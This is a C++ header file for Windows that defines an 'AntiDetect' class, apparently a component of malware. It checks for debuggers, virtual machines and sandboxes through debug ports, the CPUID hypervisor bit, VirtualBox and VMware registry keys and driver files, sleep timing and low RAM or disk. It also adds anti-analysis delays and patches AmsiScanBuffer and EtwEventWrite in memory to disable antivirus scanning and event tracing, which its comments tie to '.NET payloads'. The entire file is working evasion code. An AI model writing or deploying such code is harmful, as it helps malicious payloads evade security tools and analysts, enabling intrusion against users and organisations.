#ifndef ANTIDETECT_H
#define ANTIDETECT_H

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

class AntiDetect {
private:
    // API hashing to hide imports
    static DWORD HashString(const char* str) {
        DWORD hash = 0x35;
        while (*str) {
            hash = ((hash << 5) + hash) + *str++;
        }
        return hash;
    }

public:
    // Check for debugger
    static bool IsDebuggerPresent() {
        // Method 1: API check
        if (::IsDebuggerPresent())
            return true;
            
        // Method 2: PEB check
        BOOL debuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
        if (debuggerPresent)
            return true;
            
        // Method 3: NtQueryInformationProcess
        typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
            
        if (NtQIP) {
            DWORD debugPort = 0;
            NtQIP(GetCurrentProcess(), (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), NULL);
            if (debugPort)
                return true;
        }
        
        return false;
    }
    
    // Check for VM
    static bool IsVirtualMachine() {
        // Check 1: CPUID
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);
        if ((cpuInfo[2] >> 31) & 1) // Hypervisor bit
            return true;
            
        // Check 2: Registry keys
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        
        // Check 3: Common VM files
        if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES)
            return true;
        if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vmhgfs.sys") != INVALID_FILE_ATTRIBUTES)
            return true;
            
        return false;
    }
    
    // Check for sandbox
    static bool IsSandbox() {
        // Check 1: Sleep acceleration
        DWORD start = GetTickCount();
        Sleep(500);
        DWORD elapsed = GetTickCount() - start;
        if (elapsed < 450) // Sandboxes often accelerate time
            return true;
            
        // Check 2: Low system resources (typical of sandbox)
        MEMORYSTATUSEX memStatus = {0};
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) // Less than 2GB RAM
            return true;
            
        // Check 3: Low disk space
        ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
        if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
            if (totalNumberOfBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) // Less than 60GB
                return true;
        }
        
        return false;
    }
    
    // Anti-analysis delay
    static void AntiAnalysisDelay() {
        // Random delays to confuse automated analysis
        srand(GetTickCount());
        Sleep(rand() % 3000 + 1000);
        
        // Useless loops to waste CPU
        volatile int dummy = 0;
        for (int i = 0; i < 1000000; i++) {
            dummy += i;
        }
    }
    
    // Patch AMSI for .NET payloads
    static bool PatchAMSI() {
        // AMSI bypass pattern
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
        
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return false;
        
        // Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
        BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
        
        DWORD oldProtect;
        if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
            return false;
            
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        
        return true;
    }
    
    // Patch ETW
    static bool PatchETW() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return false;
        
        // Patch: ret
        BYTE patch[] = {0xC3};
        
        DWORD oldProtect;
        if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
            return false;
            
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        
        return true;
    }
};

#endif
